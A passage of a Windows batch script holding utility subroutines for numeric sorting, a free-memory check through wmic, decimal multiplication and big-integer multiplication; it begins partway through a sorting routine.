for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=!p.ok! %%i")
endlocal&set %~2=%p.ok:~1%&goto :EOF
:sortza
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=%%i !p.ok!")
endlocal&set %~2=%p.ok%&goto :EOF
:checkmem
setlocal
if "%1" equ "" (goto :eof)
if "%2" equ "" (goto :eof)
if "%3" equ "" (goto :eof)
for /f "tokens=2 delims==" %%a in ('"wmic OS get FreePhysicalMemory /Value"') do (
	set "mem=%%a"
	set "mem=!mem:~0,-1!"
	if !mem! %1 %2 (
		endlocal&set %3=1
	) else (
		endlocal&set %3=0
	)
)
goto :eof
:xcf
setlocal
set "num1=%1"
set "num2=%2"
if "!num1!" equ "" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num1!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num1!") do (
		set "num1a=%%a"
		set "num1b=%%b"
	)
)
if "!num1a!" equ "0" (
	set num1a=
)
:xcf_loop1
if "!num1b:~-1!" equ "0" (
	set "num1b=!num1b:~0,-1!"
	goto xcf_loop1
)
if "!num1b!" equ "" (
	set dot1=0
) else (
	call :strlen num1b dot1
)
if "!num2!" equ "0" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num2!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num2!") do (
		set "num2a=%%a"
		set "num2b=%%b"
	)
)
if "!num2a!" equ "0" (
	set num2a=
)
:xcf_loop2
if "!num2b:~-1!" equ "0" (
	set "num2b=!num2b:~0,-1!"
	goto xcf_loop2
)
if "!num2b!" equ "" (
	set dot2=0
) else (
	call :strlen num2b dot2
)
set /a "dot=dot1+dot2"
set /a "num=!num1a!!num1b!*!num2a!!num2b!"
set "numa=!num:~0,-%dot%!"
set "numb=!num:~-%dot%!"
:xcf_loop
if "!numb:~-1!" equ "0" (
	set "numb=!numb:~0,-1!"
	goto xcf_loop
)
if "!dot!" neq "0" (
	set "num=!numa!.!numb!"
)
if "!num:~-1!" equ "." (
	set "num=!num:~0,-1!"
)
if "!num:~0,1!" equ "." (
	set "num=!num:.=0.!"
)
if "!num:~0,2!" equ "-." (
	set "num=-0.!num:~2!"
)
if "%3" neq "" (
		endlocal&set "%3=%num%"
		goto :eof
) else (
		echo;!num!
		goto :eof
)
:scf
if "%~1"=="0" Endlocal&set %~3=0&goto :EOF
if "%~2"=="0" Endlocal&set %~3=0&goto :EOF
set f=&set jia=&set ji=&set /a n1=0,n2=0
set vard1=&set "vard2="&set var1=%~1&set "var2=%~2"
for /l %%a in (0 1 9) do (
set var1=!var1:%%a= %%a !&set var2=!var2:%%a= %%a !)
for %%a in (!var1!)do (set /a n1+=1&set vard1=%%a !vard1!)
for %%a in (!var2!)do (set /a n2+=1&set vard2=%%a !vard2!)
if !n1! gtr !n2! (set vard1=%vard2%&set vard2=%vard1%)
for %%a in (!vard1!) do (set "t="&set /a j=0
for %%b in (!vard2!) do (if "!jia!"=="" set /a jia=0
set /a a=%%a*%%b+j+!jia:~-1!&set "t=!a:~-1!!t!"
set a=0!a!&set "j=!a:~-2,1!"&set jia=!jia:~0,-1!)
set "ji=!t:~-1!!ji!"
if "!j:~0,1!"=="0" (set ss=) else set "ss=!j:~0,1!"
set jia=!ss!!t:~0,-1!)
if not "!j:~0,1!"=="0" set "t=!j:~0,1!!t!"
set "ji=!t!!ji:~1!"
Endlocal&set %~3=%ji%&goto :EOF
